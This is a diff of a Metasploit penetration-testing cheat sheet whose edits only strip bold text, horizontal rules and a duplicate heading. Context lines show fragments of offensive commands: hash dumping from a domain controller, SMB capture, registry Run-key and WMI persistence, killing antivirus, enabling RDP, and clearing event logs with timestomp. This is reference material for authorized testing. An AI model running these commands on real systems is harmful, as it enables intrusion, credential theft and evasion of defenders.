@@ -2,11 +2,9 @@
 
 This Metasploit Framework cheat sheet covers the essential commands and workflows for comprehensive penetration testing, from initial reconnaissance to post-exploitation and persistence.
 
-## Metasploit Framework Cheat Sheet for Penetration Testing
-
 ### Installation & Setup
 
-**Installing and configuring the open-source Metasploit Framework across different platforms**
+Installing and configuring the open-source Metasploit Framework across different platforms.
 
 bash
 
@@ -40,11 +38,9 @@ msfupdate
 msfconsole --version
 ```
 
-***
-
 ### Initial Reconnaissance & Information Gathering
 
-**Using Metasploit modules to gather intelligence about targets before exploitation**
+Using Metasploit modules to gather intelligence about targets before exploitation.
 
 bash
 
@@ -81,11 +77,9 @@ set RPORT 80
 run
 ```
 
-***
-
 ### Vulnerability Scanning & Assessment
 
-**Identifying potential vulnerabilities using Metasploit's built-in scanners**
+Identifying potential vulnerabilities using Metasploit's built-in scanners.
 
 bash
 
@@ -126,11 +120,9 @@ set PASS_FILE /usr/share/wordlists/metasploit/default_pass.txt
 run
 ```
 
-***
-
 ### Exploitation Phase
 
-**Launching exploits against identified vulnerabilities to gain initial access**
+Launching exploits against identified vulnerabilities to gain initial access.
 
 bash
 
@@ -171,11 +163,9 @@ set RHOSTS file:/tmp/targets.txt  # Load targets from file
 set THREADS 10               # For multiple targets
 ```
 
-***
-
 ### Payload Configuration & Handlers
 
-**Configuring payloads and setting up listeners for reverse connections**
+Configuring payloads and setting up listeners for reverse connections.
 
 bash
 
@@ -207,11 +197,9 @@ set URIPATH /
 exploit
 ```
 
-***
-
 ### Post-Exploitation & Lateral Movement
 
-**Maintaining access, gathering information, and moving through the network**
+Maintaining access, gathering information, and moving through the network.
 
 bash
 
@@ -253,11 +241,9 @@ run post/windows/gather/smart_hashdump  # Dump hashes from DC
 use auxiliary/server/capture/smb        # SMB relay attack
 ```
 
-***
-
 ### Persistence & Backdoors
 
-**Establishing persistent access to compromised systems**
+Establishing persistent access to compromised systems.
 
 bash
 
@@ -284,11 +270,9 @@ reg setval -k HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run -v "Window
 run post/windows/manage/wmi_persistence
 ```
 
-***
-
 ### Network Pivoting & Tunneling
 
-**Using compromised systems to access internal network segments**
+Using compromised systems to access internal network segments.
 
 bash
 
@@ -319,11 +303,9 @@ set PORTS 80,443,22,3389
 run
 ```
 
-***
-
 ### Web Application Exploitation
 
-**Targeting web applications and services specifically**
+Targeting web applications and services specifically.
 
 bash
 
@@ -357,11 +339,9 @@ set RHOSTS 192.168.1.100
 run
 ```
 
-***
-
 ### Password Attacks & Cracking
 
-**Conducting password attacks and processing captured credentials**
+Conducting password attacks and processing captured credentials.
 
 bash
 
@@ -401,11 +381,9 @@ set DELAY 10
 run
 ```
 
-***
-
 ### Evasion & Anti-Forensics
 
-**Bypassing security controls and covering tracks**
+Bypassing security controls and covering tracks.
 
 bash
 
@@ -434,11 +412,9 @@ run post/windows/manage/killav
 run post/windows/manage/enable_rdp
 ```
 
-***
-
 ### Database Integration & Automation
 
-**Using the database for efficient penetration testing workflow**
+Using the database for efficient penetration testing workflow.
 
 bash
 
@@ -467,8 +443,6 @@ services -o /tmp/services.csv
 makerc save.rc            # Save commands to resource file
 resource /path/to/script.rc  # Run commands from file
 ```
-
-***
 
 ### Useful Meterpreter Commands Quick Reference
 
@@ -499,8 +473,6 @@ run persistence, run post/windows/manage/persistence_exe
 clearev, timestomp
 ```
 
-***
-
 ### Common Resource Scripts for Automation
 
 bash
@@ -520,4 +492,3 @@ services -o /tmp/client_services.csv
 # Run with: msfconsole -r basic_scan.rc
 ```
 
-This Metasploit Framework cheat sheet covers the essential commands and workflows for comprehensive penetration testing, from initial reconnaissance to post-exploitation and persistence.
